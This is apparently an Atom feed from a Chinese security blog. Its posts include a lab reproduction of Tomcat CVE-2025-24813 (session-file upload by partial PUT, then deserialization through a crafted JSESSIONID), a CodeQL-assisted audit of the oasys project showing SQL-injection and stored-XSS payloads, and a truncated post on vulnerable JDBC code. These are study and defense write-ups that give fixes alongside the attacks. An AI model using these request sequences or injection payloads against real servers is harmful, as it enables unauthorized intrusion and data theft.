<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Jasper_sec</title>
  
  
  <link href="https://jaspersec.top/atom.xml" rel="self"/>
  
  <link href="https://jaspersec.top/"/>
  <updated>2025-03-31T22:09:47.242Z</updated>
  <id>https://jaspersec.top/</id>
  
  <author>
    <name>Jasper_sec</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Tomcat CVE-2025-24813 复现</title>
    <link href="https://jaspersec.top/posts/2631321160.html"/>
    <id>https://jaspersec.top/posts/2631321160.html</id>
    <published>2025-03-27T09:01:00.000Z</published>
    <updated>2025-03-31T22:09:47.242Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>最近爆出的 tomcat session 反序列化漏洞，思路比较明确，但是需要开配置，稍微鸡肋。</p><p>PS：这个洞刚出的时候，看到许少发pyq于是看了下，但是因为学校论文和找实习的事拖了俩礼拜没写文章，惨惨（） <del>btw，来个厂子收了我罢</del></p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>有两种调试方法，一种是直接搭建源码调试环境，一种是配置 tomcat 后添加 lib 依赖，分别对应下面两个教程：</p><ol><li>郑瀚师傅的源码调试： <a href="https://www.cnblogs.com/LittleHann/p/17735106.html">https://www.cnblogs.com/LittleHann/p/17735106.html</a></li><li>idea 部署 tomcat： <a href="https://blog.csdn.net/qq_74312232/article/details/137474027">https://blog.csdn.net/qq_74312232/article/details/137474027</a></li></ol><p>PS：这里采用法二，第一种方法会有各种问题，包括 build error、缺少 java.lang.xxx 等等，可以解决但是会很麻烦。</p><p>法二的大致思路：部署 tomcat-binary ，idea 添加一个 web framework（artifact），然后运行这个 artifact；至于源码调试，直接把 tomcat-binary 的 lib 里的 jar 包全部 add as library 就好，里面还有些小坑，这里详细说一下。</p><p>首先下载 tomcat-binary-9.0.98： <a href="https://archive.apache.org/dist/tomcat/tomcat-9/v9.0.98/bin/apache-tomcat-9.0.98.zip">https://archive.apache.org/dist/tomcat/tomcat-9/v9.0.98/bin/apache-tomcat-9.0.98.zip</a></p><p>然后 idea new 一个 空 maven 项目，然后选中项目根目录，双击shift 输入 <code>add framework</code><br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/fae30492f9879a8e999dd9915b25a66a.png"></p><p>若成功，则会弹出下面的页面，选择 web 框架并添加，这是帮助我们添加一个适配 tomcat 的 web 目录架构。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/42aae67182364e8b5a5f694182b025c2.png"></p><p>点击 OK 添加后， 目录下会多出一个web目录，web目录下的index.jsp是我们后续会访问的地方。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/6f88d54120f1268c7259392db86e737e.png"></p><p>注意：还需要将 Web 目录添加到 source root，不然会出现 404 Not Found。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/37a94ddbc45a15ad9670d6b6b4424d27.png"></p><p>下面配置 tomcat，右上角 add environment，选择添加 tomcat local server，并进行配置，下面的两个路径都是之前下载的 tomcat-binary 的根目录。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/77e183751c957d2f8e933f4679e9d5de.png"></p><p>注意到右下角有个 Fix，提醒我们添加 artifact，点击 Fix 自动跳转的 Deployment Tab，这里的 Application context 可改可不改，我这里保持原样。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/3f2af23a0ac6e5e39ae06404e20b7164.png"></p><p>至此 tomcat 就配置完毕了，点击运行应该会去访问创建的index.jsp，出现一个 END 字样。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/2f779c72684475378787918eb84173b3.png"></p><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/98ca94247dc9e77cbdd13c24c4b9cdff.png"></p><p>然后为了能够 debug，需要添加 tomat lib 到 idea 里，把 tomcat-binary 目录下的 lib 复制一份到项目根目录，然后右键 add as library 即可。注意：要利用漏洞的话，还需加一个漏洞依赖，例如 CC3.2.1。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/2564016aa0d9ec62e04f225b9989453b.png"></p><p>打断点<code>org.apache.catalina.servlets.DefaultServlet#doGet</code>，访问<code>http://localhost:8080/CVE_2025_24813_war_exploded/123</code>，成功断下，可调式环境搭建完成。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/5cf6dc82762687137961c82d98babf16.png"></p><p>接下来是开启漏洞所需的配置项，不开配置无法上传 session，所以有点鸡肋。</p><p>web.xml</p><figure class="highlight xml"><figcaption><span>title:"web.xml"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param-name</span>&gt;</span>readonly<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param-value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br></pre></td></tr></table></figure><p>context.xml</p><figure class="highlight xml"><figcaption><span>title:"context.xml"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Manager</span> <span class="attr">className</span>=<span class="string">&quot;org.apache.catalina.session.PersistentManager&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Store</span> <span class="attr">className</span>=<span class="string">&quot;org.apache.catalina.session.FileStore&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Manager</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/d6c81e3ea0e677d49ae5494e3d3a8feb.png"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞本质：利用 PUT 协议上传恶意 Session 到服务器，由于服务器读取 Session 是反序列化读取，导致反序列化漏洞。</p><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><ul><li>9.0.0.M1 &lt;&#x3D; tomcat &lt;&#x3D; 9.0.98</li><li>10.1.0-M1 &lt;&#x3D; tomcat &lt;&#x3D; 10.1.34</li><li>11.0.0-M1 &lt;&#x3D; tomcat &lt;&#x3D; 11.0.2</li></ul><h3 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h3><p>step1：上传恶意 session 到服务器</p><figure class="highlight http"><figcaption><span>title:"Step1"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PUT /CVE_2025_24813_war_exploded/Jasper_sec/session HTTP/1.1  </span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8080</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>1000  </span><br><span class="line"><span class="attribute">Content-Range</span><span class="punctuation">: </span>bytes 0-1000/1200  </span><br><span class="line"></span><br><span class="line">此处是java序列化payload，</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/7d4f143675d7aec19f8825c7b5d6b283.png"><br>step2：触发 session 反序列化</p><figure class="highlight http"><figcaption><span>title:"Step2"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /CVE_2025_24813_war_exploded/ HTTP/1.1  </span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8080  </span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=.Jasper_sec</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/ab00435962519c5d07200fd3fcfed3d4.png"></p><h3 id="漏洞调试"><a href="#漏洞调试" class="headerlink" title="漏洞调试"></a>漏洞调试</h3><p>首先是 Session文件的上传，路由处理在 <code>org.apache.catalina.servlets.DefaultServlet#doPut</code>，开头就能看到，如果 <code>readonly=true</code> 的话，会直接 send not allowed，所以需要通过配置文件设置 <code>readonly=false</code>。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/f0fa97923d4f4b5f1346685265688308.png"></p><p>然后如果请求里有 <code>Content-Range</code>，并且符合一定规则，就可以进到 else 逻辑，触发<code>DefaultServlet#executePartialPut</code><br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/84dc5c7f4270d34b0968b288122d4f34.png"></p><p><code>org.apache.catalina.servlets.DefaultServlet#executePartialPut</code> 会把文件上传的 tomcat 设置的 tmp 目录里，文件名是把路由的 <code>&quot;/&quot;</code>  替换成 <code>&quot;.&quot;</code>，所以  <code>/Jasper_sec/session</code> 变成了 <code>.Jasper_sec.session</code>，实现了 Session  文件的上传。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/ce1dd1e3efd71a6ab7176f30204a0bbe.png"></p><p>然后是触发 Session 反序列化，这个也很简单，就是读取 Cookie 的 JSESSIONID 然后做拼接，可以看这个 load 函数，逻辑会很清晰：<code>org.apache.catalina.session.FileStore#load</code>，包括拼接文件名，然后执行对文件内容反序列化。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/8a7c7477437120777634195a67dc124c.png"><br>函数调用栈</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">transform:120, InvokerTransformer (org.apache.commons.collections.functors)</span><br><span class="line">get:158, LazyMap (org.apache.commons.collections.map)</span><br><span class="line">getValue:74, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">hashCode:121, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">hash:338, HashMap (java.util)</span><br><span class="line">readObject:1397, HashMap (java.util)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:497, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:1058, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:1900, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:1801, ObjectInputStream (java.io)</span><br><span class="line">readObject0:1351, ObjectInputStream (java.io)</span><br><span class="line">readObject:371, ObjectInputStream (java.io)</span><br><span class="line">doReadObject:1199, StandardSession (org.apache.catalina.session)</span><br><span class="line">readObjectData:846, StandardSession (org.apache.catalina.session)</span><br><span class="line">load:203, FileStore (org.apache.catalina.session)</span><br><span class="line">loadSessionFromStore:723, PersistentManagerBase (org.apache.catalina.session)</span><br><span class="line">swapIn:672, PersistentManagerBase (org.apache.catalina.session)</span><br><span class="line">findSession:467, PersistentManagerBase (org.apache.catalina.session)</span><br><span class="line">doGetSession:2723, Request (org.apache.catalina.connector)</span><br><span class="line">getSessionInternal:2468, Request (org.apache.catalina.connector)</span><br><span class="line">invoke:452, AuthenticatorBase (org.apache.catalina.authenticator)</span><br><span class="line">invoke:130, StandardHostValve (org.apache.catalina.core)</span><br><span class="line">invoke:93, ErrorReportValve (org.apache.catalina.valves)</span><br><span class="line">invoke:660, AbstractAccessLogValve (org.apache.catalina.valves)</span><br><span class="line">invoke:74, StandardEngineValve (org.apache.catalina.core)</span><br><span class="line">service:346, CoyoteAdapter (org.apache.catalina.connector)</span><br><span class="line">service:396, Http11Processor (org.apache.coyote.http11)</span><br><span class="line">process:63, AbstractProcessorLight (org.apache.coyote)</span><br><span class="line">process:937, AbstractProtocol$ConnectionHandler (org.apache.coyote)</span><br><span class="line">doRun:1791, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)</span><br><span class="line">run:52, SocketProcessorBase (org.apache.tomcat.util.net)</span><br><span class="line">runWorker:1190, ThreadPoolExecutor (org.apache.tomcat.util.threads)</span><br><span class="line">run:659, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)</span><br><span class="line">run:63, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)</span><br><span class="line">run:745, Thread (java.lang)</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://forum.butian.net/article/674">https://forum.butian.net/article/674</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;漏洞简介&quot;&gt;&lt;a href=&quot;#漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;漏洞简介&quot;&gt;&lt;/a&gt;漏洞简介&lt;/h2&gt;&lt;p&gt;最近爆出的 tomcat session 反序列化漏洞，思路比较明确，但是需要开配置，稍微鸡肋。&lt;/p&gt;
&lt;p&gt;PS：这个洞</summary>
      
    
    
    
    
    <category term="Java" scheme="https://jaspersec.top/tags/Java/"/>
    
    <category term="反序列化" scheme="https://jaspersec.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="漏洞复现" scheme="https://jaspersec.top/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>CodeQL 进阶</title>
    <link href="https://jaspersec.top/posts/1777878032.html"/>
    <id>https://jaspersec.top/posts/1777878032.html</id>
    <published>2025-03-22T10:20:00.000Z</published>
    <updated>2025-03-31T22:09:47.241Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Wrong password." data-whm="Sorry, this article cannot be verified, but you can still see the decrypted content.">  <script id="hbeData" type="hbeData" data-hmacdigest="cfa299d70fbd03ac731933af8feae32713eae5ecf2239ae0ee48829f70d743e7"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">Please input password.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">请输入密码查看文章.</summary>
    
    
    
    
    <category term="Java" scheme="https://jaspersec.top/tags/Java/"/>
    
    <category term="codeql" scheme="https://jaspersec.top/tags/codeql/"/>
    
    <category term="代码审计" scheme="https://jaspersec.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="need_password" scheme="https://jaspersec.top/tags/need-password/"/>
    
  </entry>
  
  <entry>
    <title>oasys 代码审计</title>
    <link href="https://jaspersec.top/posts/3302810806.html"/>
    <id>https://jaspersec.top/posts/3302810806.html</id>
    <published>2025-03-18T19:47:00.000Z</published>
    <updated>2025-04-02T12:08:33.317Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://xmcve.com/">星盟安全团队</a>长期招新中~ 我们的目标是星辰大海！ </p><ul><li>简历格式：ID、联系方式、掌握技术、比赛情况</li><li>简历投递邮箱： <a href="mailto:&#x78;&#109;&#99;&#118;&#x65;&#x40;&#113;&#113;&#46;&#x63;&#x6f;&#x6d;">&#x78;&#109;&#99;&#118;&#x65;&#x40;&#113;&#113;&#46;&#x63;&#x6f;&#x6d;</a></li><li>联系QQ：1609410364</li></ul><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>oasys 这个项目适合新手代审入门，尝试了下 <code>codeql + 人工</code> 的审计的思路，最后效果还是不错的。<br>项目地址： <a href="https://github.com/misstt123/oasys">https://github.com/misstt123/oasys</a></p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="调试环境"><a href="#调试环境" class="headerlink" title="调试环境"></a>调试环境</h3><p>标准maven项目，README.md有教程，不多赘述。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/a657ce23fd0a0a25937d89a9c59308bb.png"></p><h3 id="codeql环境"><a href="#codeql环境" class="headerlink" title="codeql环境"></a>codeql环境</h3><p>标准 mvn 项目，一行命令搞定。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql database create oasys-database --language=java --command=&quot;mvn clean package -Dmaven.test.skip=true&quot; --source-root ./ --ram=32000 --threads=4 --overwrite</span><br></pre></td></tr></table></figure><p>直接使用自带的分析脚本， codeql analyse 一键分析：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 直接指定查询脚本根目录，codeql会自动递归查找</span></span></span><br><span class="line">codeql database analyze .\oasys-master D:\Security\tools\codeql\codeql-cli\qlpacks\codeql\java-queries\1.2.0\experimental\Security\CWE --format=csv --output=oasys_scan_result.csv --ram=32000 --threads=4</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 直接指定查询套件，套件封装好了去查哪些脚本</span></span></span><br><span class="line">codeql database analyze .\oasys-master\ D:\Security\tools\codeql\codeql-cli\qlpacks\codeql\java-queries\1.2.0\codeql-suites\java-security-experimental.qls --format=csv --output=oasys_scan_result.csv --ram=32000 --threads=4</span><br></pre></td></tr></table></figure><p>注意：如果不特别指定查询脚本，而默认使用 <code>java-code-scanning.qls</code>效果差，得用<code>java-security-experimental.qls</code><br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/3a000c25213a8473ae5e8d60d1560966.png"><br>可以看到，查出来了 SQL注入、log注入、文件名注入、CSRF等等，codeql当作漏扫还是挺好用的哈哈 XD<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/c83477f637250ea16a1ccc5063672c4d.png"></p><h2 id="组件漏洞"><a href="#组件漏洞" class="headerlink" title="组件漏洞"></a>组件漏洞</h2><p>README.md 里写了使用到的组件， 可以看到常见的漏洞组件有：freemaker、fastjson、mybatis<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/e351ded1731c386cd8524444615c13b6.png"></p><h3 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h3><p>漏洞函数：</p><ol><li>parse</li><li>parseObject<br><code>parse</code> 和 <code>parseObject</code>，这边我用 codeql 搜索、全局搜索都是没有写对应逻辑的，遂放弃。<figure class="highlight q"><figcaption><span>title:"查找 fastjson 漏洞函数"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line">class Sink extends Method &#123; </span><br><span class="line">    Sink() &#123;</span><br><span class="line">        this.getName() = <span class="string">&quot;parseObject&quot;</span></span><br><span class="line">        <span class="built_in">or</span> this.getName() = <span class="string">&quot;parse&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">from</span> Sink sink</span><br><span class="line"><span class="keyword">select</span> sink,sink.getQualifiedName(),sink.getFile().getAbsolutePath()</span><br></pre></td></tr></table></figure></li></ol><h3 id="freemarker"><a href="#freemarker" class="headerlink" title="freemarker"></a>freemarker</h3><p>freemarker 低版本情况下，需要能够上传恶意模板文件，或者修改原有模板文件实现 RCE 或者任意文件读取，但整个项目并没有发现模板修改或者文件上传点，故放弃。</p><h3 id="log4j"><a href="#log4j" class="headerlink" title="log4j"></a>log4j</h3><p>查看 pom 依赖发现并没有 log4j2-core 这个jar包，项目使用的是 slf4j，虽然log参数可控，但是无法利用。</p><h2 id="基础漏洞"><a href="#基础漏洞" class="headerlink" title="基础漏洞"></a>基础漏洞</h2><h3 id="informListPaging-SQLI"><a href="#informListPaging-SQLI" class="headerlink" title="informListPaging - SQLI"></a>informListPaging - SQLI</h3><p>全局搜索 <code>$&#123;</code>，<code>notice-mapper.xml</code> 里发现了 like 语句的动态拼接，显然是漏洞点<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/c410eab4aa21823ee0906ed02259266b.png"><br>回溯代码逻辑，参数是否用户可控，最终找到<code>cn.gson.oasys.controller.inform.InformController#informListPaging</code>，basKey 可控且为字符串类型，显然可控。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/ed647c42680ec76cd9e5bab29895cf16.png"><br>构造 payload 实现 like SQL注入<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1167473d2e252d57da9347b5ec64b021.png"><br><strong>防御思路</strong>：like 后的参数改为使用 <code>concat(&quot;%&quot;,#&#123;xxx&#125;,&quot;%&quot;) </code>的形式，不要使用 <code>$&#123;&#125;</code> 动态拼接用户参数。</p><h3 id="outaddresspaging-SQLI"><a href="#outaddresspaging-SQLI" class="headerlink" title="outaddresspaging - SQLI"></a>outaddresspaging - SQLI</h3><p>和上面的思路一样，全局搜索后在 <code>address-mapper.xml</code> 发现在 like 后面存在滥用 <code>$&#123;&#125;</code> 的情况<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/5534556372843507a14445ea2d6138fd.png"><br>根据Mybatis映射规则找到对应路由<code>cn.gson.oasys.controller.address.AddrController#outAddress</code>，发现参数可控：<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1a4eab04dd88aceae9eaee93f8662122.png"><br>然后就是尝试构造payload利用，payload如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alph<span class="operator">=</span>Jasper<span class="string">&#x27; OR &#x27;</span><span class="number">1</span><span class="string">&#x27; like &#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/45ffdf6b0903fbb8056fa9757dba0e9d.png"><br>Jasper 的叨叨念：在大型项目里（当然不是说这个），有时很难通过代码完整地反推到路由和传参来进行利用，这时可以先找功能点，然后从用户的角度去到处点点 Fuzz 接口，再到yakit里搜索对应路由关键字找到路由<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1e6b604fd8dc8db7b3c30a54f5cb6c48.png"><br><strong>修复方案</strong>：like 后的参数改为使用 <code>concat(&quot;%&quot;,#&#123;xxx&#125;,&quot;%&quot;) </code>的形式，不要使用 <code>$&#123;&#125;</code> 动态拼接用户参数。</p><h3 id="讨论区-存储XSS"><a href="#讨论区-存储XSS" class="headerlink" title="讨论区 - 存储XSS"></a>讨论区 - 存储XSS</h3><p>普通用户和管理员均可发表讨论，插入任意js代码实现存储xss。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/6cbb038ab574080ec2888a520f4446e3.png"><br>任意用户在讨论区点击查看时触发<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/70f291c36a1c55f131edb5a75da4c71f.png"><br><strong>防御方式</strong>：</p><ol><li>对用户的输入的特殊字符做实体编码</li><li>引入 CSP</li></ol><h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><p>这个是 codeql 找到的，CSRF 逻辑洞我就没去测了，感兴趣的师傅可以试试。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这种个人作者开发的小项目漏洞还是比较明显的，人工审计很快就能找到漏洞点，同时使用 codeql 的自带的 suites 也具备一定的漏洞检出能力。<br>思考：对于这种小项目，codeql 的优势似乎没有体现出来，另外，我这里把它当作一个静态漏扫工具去使用了，这显然不是它的全部实力</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://docs.github.com/zh/code-security/code-scanning/managing-your-code-scanning-configuration/codeql-query-suites">https://docs.github.com/zh/code-security/code-scanning/managing-your-code-scanning-configuration/codeql-query-suites</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://xmcve.com/&quot;&gt;星盟安全团队&lt;/a&gt;长期招新中~ 我们的目标是星辰大海！ &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;简历格式：ID、联系方式、掌握技术、比赛情况&lt;/li&gt;
&lt;li&gt;简历投递邮箱： &lt;a href=&quot;mailto:&amp;#x78;&amp;#1</summary>
      
    
    
    
    
    <category term="Java" scheme="https://jaspersec.top/tags/Java/"/>
    
    <category term="代码审计" scheme="https://jaspersec.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Java基础漏洞 - SQLI</title>
    <link href="https://jaspersec.top/posts/3957940821.html"/>
    <id>https://jaspersec.top/posts/3957940821.html</id>
    <published>2025-03-16T19:47:00.000Z</published>
    <updated>2025-03-31T22:09:47.243Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文主要对 Java 下 SQLI 的漏洞成因、防御思路做了分析总结，方便理清代码审计时的思路，漏洞样例代码参考自 <a href="https://github.com/j3ers3/Hello-Java-Sec">Hello-Java-Sec</a> 的sql 注入部分。</p><h2 id="JDBC-漏洞点"><a href="#JDBC-漏洞点" class="headerlink" title="JDBC 漏洞点"></a>JDBC 漏洞点</h2><p>JDBC 是相对较老的数据库操作方式了，印象中我在本科课程还用 eclipse 开发过小网页，其中分页查询数据的功能点用到了它。简单来说，JDBC 提供了一套调用接口，使得开发人员可以在Java代码里写SQL，并传入数据库执行。</p><h3 id="动态拼接参数"><a href="#动态拼接参数" class="headerlink" title="动态拼接参数"></a>动态拼接参数</h3><h4 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h4><p>动态拼接参数一般是使用 <code>java.sql.Statement</code> 类进行 SQL 查询时，sql 语句动态拼接用户传参导致的注入漏洞。</p><p>例如下面代码中，id 参数直接做了字符串拼接，显然是可以直接注入的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ApiOperation(value = &quot;vul: JDBC语句拼接&quot;)</span></span><br><span class="line"><span class="meta">@GetMapping(&quot;/vul1&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">vul1</span><span class="params">(String id)</span> &#123;</span><br><span class="line"><span class="type">StringBuilder</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from users where id = &#x27;&quot;</span> + id + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">Class.forName(<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br><span class="line"><span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(db_url, db_user, db_pass);</span><br><span class="line"></span><br><span class="line"><span class="type">Statement</span> <span class="variable">stmt</span> <span class="operator">=</span> 